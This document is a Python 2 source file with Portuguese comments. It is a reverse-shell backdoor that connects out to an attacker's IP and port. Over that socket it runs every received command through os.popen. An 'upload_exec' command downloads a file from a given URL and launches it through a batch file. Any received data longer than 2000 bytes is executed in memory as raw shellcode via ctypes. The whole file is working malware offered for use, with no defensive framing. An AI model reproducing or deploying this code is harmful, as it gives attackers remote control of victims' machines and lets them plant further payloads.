# -*- coding: iso-8859-1 -*-
import os,socket,sys
from ctypes import *
import urllib
import threading
import time
import string

class Downloader:

    def __init__(self):
        self.stop_down = False
        self.conexao = None

    def download(self, url, nome_arquivo):
        self.conexao = threading.Thread(target=self.__down, args=(url, nome_arquivo))
        self.conexao.start()

    def __down(self, url, dest):
        _continue = True
        handler = urllib.urlopen(url)
        self.fp = open(dest, "w")
        while not self.stop_down and _continue:
            data = handler.read(4096)
            self.fp.write(data)
            _continue = data
        handler.close()
        self.fp.close()

    def cancelar(self):
        self.stop_down = True

"""
def shellcode(shellcode):
    # funcao que executa o shellcode alocando ele na momoria
    mudar = '%s'%(shellcode)
    memoria = create_string_buffer(mudar, len(mudar))
    execute = cast(memoria, CFUNCTYPE(c_void_p))
    print shellcode
    execute()
"""

def usage():
    print '''{=}mh4.py ip_atante porta''',exit()
if len(sys.argv) < 3:usage()
s=socket.socket()
s.connect((sys.argv[1],int(sys.argv[2])))
s.send('''{+} Conectado ao cliente #\n>>>''')
while 1:
    #socket envia pacote resposta ao servidor
    data = s.recv(4096)

    # if de controle de saida  do shell
    if "q" == data.lower():
        s.close()
        break;
    else:
        if data.lower() == "upload_exec":
            s.send("{+}:Link Direto:")
            download = s.recv(4096)
            url = download
            s.send("{+}:Nome do arquivo:")
            arquivo = s.recv(4096)
            down = Downloader()
            down.download(url, "%s" %(arquivo))
            s.send("{+}:Download terminado!\n")
            s.send("{+}:Executando arquivo baixado!")
            executar = open("exec.bat","w")
            executar.write("start %s"%(arquivo))
            executar.close()
            os.system("Start exec.bat")
            s.send("executado com sucesso!")
        # caso digite CD subtituir o ultimo caractere 
        if len(data) > 2000:
            s.send('''{+} executando  shellcode!\n''')
            #shellcode(data)
            mudar = '%s'%(data)
            memoria = create_string_buffer(mudar, len(mudar))
            execute = cast(memoria, CFUNCTYPE(c_void_p))
            print shellcode
            execute()
        if data.startswith('cd'):
            os.chdir(data[3:].replace('\n',''))
            s.send("movendo para "+str(os.getcwd()))
            result='\n'
        else:
            # manda o comando executado  para servidor 
            result=os.popen(data).read()
    if (data.lower() != "q"):
        s.send(str(result)+ "{+}>>>")
        # se for diferente de 'q' manda o a saida do comando executado
    else:
        # caso for manda resultado e termina a conexão
        s.send(str(result))
        print len(data)
        s.close()
        break;
exit()




